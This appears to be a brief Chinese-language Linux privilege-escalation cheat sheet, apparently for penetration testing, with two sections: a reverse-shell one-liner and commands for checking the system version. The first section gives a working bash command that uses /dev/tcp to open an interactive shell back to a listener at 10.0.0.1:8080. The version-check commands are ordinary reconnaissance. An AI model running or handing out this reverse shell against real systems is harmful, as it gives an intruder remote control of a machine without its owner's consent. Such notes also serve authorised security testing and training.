# GUN Linux 提权笔记

###     1.1 Shell反弹
``` sh
$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
### 查看系统版本

``` sh
$ uname -a
$ cat /etc/*-release
$ cat /etc/issue
```
